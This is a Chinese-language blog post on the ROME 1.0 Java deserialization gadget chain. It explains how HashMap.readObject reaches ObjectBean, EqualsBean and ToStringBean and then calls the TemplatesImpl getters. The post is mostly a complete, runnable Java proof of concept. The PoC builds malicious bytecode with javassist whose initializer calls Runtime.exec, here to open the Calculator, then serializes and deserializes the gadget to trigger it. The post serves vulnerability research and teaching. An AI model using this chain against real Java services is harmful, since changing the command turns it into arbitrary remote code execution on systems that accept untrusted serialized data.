# Java-ROME

  
  
&lt;!--more--&gt;  
## 0x01 前言  
```xml  
&lt;dependency&gt;    
  &lt;groupId&gt;rome&lt;/groupId&gt;    
  &lt;artifactId&gt;rome&lt;/artifactId&gt;    
  &lt;version&gt;1.0&lt;/version&gt;    
&lt;/dependency&gt;  
```  
ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。  
ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。  
## 0x02 前置知识  
`com.sun.syndication.feed.impl.ObjectBean`是 Rome 提供的一个封装类型，初始化时提供了一个 Class 类型和Object 对象实例进行封装。  
ObjectBean 也是使用委托模式设计的类，其中有三个成员变量，分别是`EqualsBean/ToStringBean/CloneableBean`类，这三个类为`ObjectBean`提供了`equals`、`toString`、`clone`以及`hashCode`方法  
来看一下`ObjectBean`的`hashCode`方法，会调用`EqualsBean`的`beanHashCode`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162338396.png)
会调用`EqualsBean`中保存的`_obj`的`toString()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162339922.png)
这个`ToStringBean`的`toString()`方法可以触发`_obj`实例的全部`getter`方法，可以用来触发`TemplatesImpl`的利用链  
在`HashMap`中的`readObject`正好调用了`hashCode()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162354073.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162355420.png)
构造`exp`  
```java  
import javassist.ClassPool;    
import javassist.CtClass;    
    
import java.io.IOException;    
import java.io.ByteArrayOutputStream;    
    
import javassist.CannotCompileException;    
import javassist.NotFoundException;    
    
import java.lang.reflect.Field;    
    
    
import java.util.UUID;    
    
import com.sun.syndication.feed.impl.ObjectBean;    
import com.sun.syndication.feed.impl.ToStringBean;    
    
import java.io.*;    
import java.util.Base64;    
    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
    
import javax.xml.transform.Templates;    
import java.util.HashMap;    
    
public class Poc {    
    
    public static void main(String[] args) throws Exception {    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;, null);    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);    
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);    
        HashMap&lt;Object, String&gt; map = new HashMap&lt;&gt;();    
        map.put(objectBean, &#34;huahua&#34;);    
        String payload = serialize(map);    
        unserialize(payload);    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void unserialize(String base) throws IOException, ClassNotFoundException {    
        byte[] result = Base64.getDecoder().decode(base);    
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);    
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);    
        objectInputStream.readObject();    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
    
}  
```  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java-rome/  

